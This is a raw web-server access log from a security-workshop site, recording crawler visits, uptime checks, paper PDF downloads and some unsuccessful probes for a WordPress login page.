70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:54 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:54 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:54 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:54 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:54 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:54 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:54 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:54 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:54 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 754 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
69.162.124.227 - - [30/Apr/2018:09:30:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
64.238.147.125 - - [30/Apr/2018:09:32:59 -0400] "GET /sites/nspw/images/nspw-logo-smaller.jpg HTTP/1.1" 404 4060 "-" "Java/1.8.0_162"
66.249.73.89 - - [30/Apr/2018:09:33:18 -0400] "GET /2009/proceedings/2003/nspw2003-perrin.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
191.55.9.246 - - [30/Apr/2018:09:34:44 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
191.55.9.246 - - [30/Apr/2018:09:34:46 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:09:35:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
103.66.226.58 - - [30/Apr/2018:09:35:52 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.66.226.58 - - [30/Apr/2018:09:35:54 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [30/Apr/2018:09:36:38 -0400] "GET /2007/past.shtml HTTP/1.1" 200 5744 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [30/Apr/2018:09:37:52 -0400] "GET /2007/submission.shtml HTTP/1.1" 200 5396 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:09:38:14 -0400] "GET /2006/cfp2006.pdf HTTP/1.1" 200 40969 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:09:38:40 -0400] "GET /2009/proceedings/2005/?C=D;O=A HTTP/1.1" 200 4491 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
194.187.170.110 - - [30/Apr/2018:09:38:58 -0400] "GET /2017/accepted HTTP/1.1" 200 7136 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
101.199.108.55 - - [30/Apr/2018:09:39:09 -0400] "GET / HTTP/1.1" 200 6643 "-" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:09 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2303 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:09 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1029 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:09 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 902 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:09 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1734 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:09 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 630 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:09 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 742 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:09 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 662 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:09 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1061 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:09 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5375 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:09 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 773 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:10 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:10 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7375 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
101.199.108.55 - - [30/Apr/2018:09:39:10 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27630 "https://www.nspw.org/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
69.162.124.227 - - [30/Apr/2018:09:40:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [30/Apr/2018:09:42:09 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
120.35.33.25 - - [30/Apr/2018:09:42:14 -0400] "GET /2009/proceedings/1996/nspw1996-josang.pdf HTTP/1.1" 206 3787 "https://www.nspw.org/2009/proceedings/1996/nspw1996-josang.pdf" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.90 Safari/537.36 2345Explorer/9.2.1.17116"
66.249.73.87 - - [30/Apr/2018:09:42:25 -0400] "GET / HTTP/1.1" 200 6604 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
120.35.33.25 - - [30/Apr/2018:09:42:14 -0400] "GET /2009/proceedings/1996/nspw1996-josang.pdf HTTP/1.1" 206 988992 "https://www.nspw.org/2009/proceedings/1996/nspw1996-josang.pdf" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.90 Safari/537.36 2345Explorer/9.2.1.17116"
129.78.110.124 - - [30/Apr/2018:09:44:40 -0400] "GET / HTTP/1.1" 200 6352 "http://nspw.org" "-"
69.162.124.227 - - [30/Apr/2018:09:45:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [30/Apr/2018:09:45:14 -0400] "GET /2018 HTTP/1.1" 200 6904 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.39.254.53 - - [30/Apr/2018:09:45:21 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.39.254.53 - - [30/Apr/2018:09:45:22 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.102.6.199 - - [30/Apr/2018:09:45:31 -0400] "GET /papers/2011/nspw2011-pieters.pdf HTTP/1.1" 200 2771026 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.102.7.55 - - [30/Apr/2018:09:45:31 -0400] "GET /papers/2011/nspw2011-pieters.pdf HTTP/1.1" 200 2771026 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.6.201 - - [30/Apr/2018:09:45:36 -0400] "GET /favicon.ico HTTP/1.1" 404 4094 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.73.87 - - [30/Apr/2018:09:47:12 -0400] "GET /2009/proceedings/1993/nspw1993-lin.pdf HTTP/1.1" 200 1018564 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.231.15.22 - - [30/Apr/2018:09:49:29 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/1997/nspw1997-moskowitz.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
185.231.15.22 - - [30/Apr/2018:09:49:28 -0400] "GET /papers/1997/nspw1997-moskowitz.pdf HTTP/1.1" 200 1361671 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
69.162.124.227 - - [30/Apr/2018:09:50:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
42.106.24.97 - - [30/Apr/2018:09:50:12 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
42.106.24.97 - - [30/Apr/2018:09:50:13 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [30/Apr/2018:09:51:31 -0400] "GET /papers/2005/nspw2005-locasto.pdf HTTP/1.1" 200 2008772 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:09:52:31 -0400] "GET /2004/program.shtml HTTP/1.1" 200 6742 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
84.25.22.138 - - [30/Apr/2018:09:52:41 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 200 700275 "http://www.kay-hamacher.de/publications.shtml" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
84.25.22.138 - - [30/Apr/2018:09:52:45 -0400] "GET /favicon.ico HTTP/1.1" 404 3777 "https://www.nspw.org/papers/2011/nspw2011-hamacher.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
14.215.176.14 - - [30/Apr/2018:09:52:49 -0400] "GET / HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.14 - - [30/Apr/2018:09:52:50 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.14 - - [30/Apr/2018:09:52:50 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1025 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.4 - - [30/Apr/2018:09:52:50 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1723 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.4 - - [30/Apr/2018:09:52:50 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 884 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.6 - - [30/Apr/2018:09:52:50 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 643 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.8 - - [30/Apr/2018:09:52:50 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 737 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.6 - - [30/Apr/2018:09:52:50 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 610 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.14 - - [30/Apr/2018:09:52:50 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.4 - - [30/Apr/2018:09:52:51 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.4 - - [30/Apr/2018:09:52:51 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.8 - - [30/Apr/2018:09:52:51 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.6 - - [30/Apr/2018:09:52:51 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
14.215.176.14 - - [30/Apr/2018:09:52:51 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
77.88.47.40 - - [30/Apr/2018:09:53:22 -0400] "GET /2008/papers.shtml HTTP/1.1" 200 5730 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:09:54:30 -0400] "GET /2005/proceedings.shtml HTTP/1.1" 200 4810 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
84.201.133.45 - - [30/Apr/2018:09:54:32 -0400] "GET /proceedings/2010 HTTP/1.1" 200 7388 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [30/Apr/2018:09:56:05 -0400] "GET /papers/2010/nspw2010-alsaleh.pdf HTTP/1.1" 200 1019662 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
203.133.169.137 - - [30/Apr/2018:09:56:49 -0400] "GET /robots.txt HTTP/1.1" 200 5853 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
203.133.169.137 - - [30/Apr/2018:09:56:58 -0400] "GET / HTTP/1.1" 200 6701 "-" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) Safari/538.1 Daum/4.1"
203.133.169.137 - - [30/Apr/2018:09:56:58 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) Safari/538.1 Daum/4.1"
203.133.169.137 - - [30/Apr/2018:09:56:58 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1583 "https://www.nspw.org/" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) Safari/538.1 Daum/4.1"
203.133.169.137 - - [30/Apr/2018:09:56:58 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7510 "https://www.nspw.org/" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) Safari/538.1 Daum/4.1"
203.133.169.137 - - [30/Apr/2018:09:57:05 -0400] "GET /robots.txt HTTP/1.1" 200 2763 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
203.133.169.137 - - [30/Apr/2018:09:57:22 -0400] "GET /introduction HTTP/1.1" 200 11501 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
203.133.169.137 - - [30/Apr/2018:09:57:33 -0400] "GET /2014/program HTTP/1.1" 200 17223 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
203.133.169.137 - - [30/Apr/2018:09:57:45 -0400] "GET /2015/dates HTTP/1.1" 200 12311 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
203.133.169.137 - - [30/Apr/2018:09:57:56 -0400] "GET /2014/organizers HTTP/1.1" 200 14423 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
69.162.124.227 - - [30/Apr/2018:09:58:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
115.99.101.247 - - [30/Apr/2018:09:58:24 -0400] "GET /papers/2008/nspw2008-julisch.pdf HTTP/1.1" 200 431550 "https://www.google.co.in/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/61.0.3163.73 Mobile/15E216 Safari/602.1"
194.187.170.110 - - [30/Apr/2018:09:59:47 -0400] "GET /2017/organizers HTTP/1.1" 200 7520 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
66.249.73.89 - - [30/Apr/2018:10:00:38 -0400] "GET /papers/2012/docs/p1.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
41.109.110.202 - - [30/Apr/2018:10:02:04 -0400] "GET /wp-login.php HTTP/1.1" 404 8176 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.109.110.202 - - [30/Apr/2018:10:02:05 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.221.202.254 - - [30/Apr/2018:10:04:36 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.221.202.254 - - [30/Apr/2018:10:04:37 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:10:05:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [30/Apr/2018:10:05:12 -0400] "GET /papers/2005/nspw2005-van_oorschot.pdf HTTP/1.1" 200 2313784 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
124.104.196.9 - - [30/Apr/2018:10:05:40 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
124.104.196.9 - - [30/Apr/2018:10:05:42 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
49.151.174.215 - - [30/Apr/2018:10:05:55 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
49.151.174.215 - - [30/Apr/2018:10:05:56 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
100.43.85.163 - - [30/Apr/2018:10:06:32 -0400] "GET /proceedings/2007 HTTP/1.1" 200 6872 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:06:34 -0400] "GET /papers/1994/?C=M;O=D HTTP/1.1" 200 4372 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:06:45 -0400] "GET /2009/proceedings/2007/?C=D;O=D HTTP/1.1" 200 4364 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:06:47 -0400] "GET /introduction HTTP/1.1" 200 3213 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
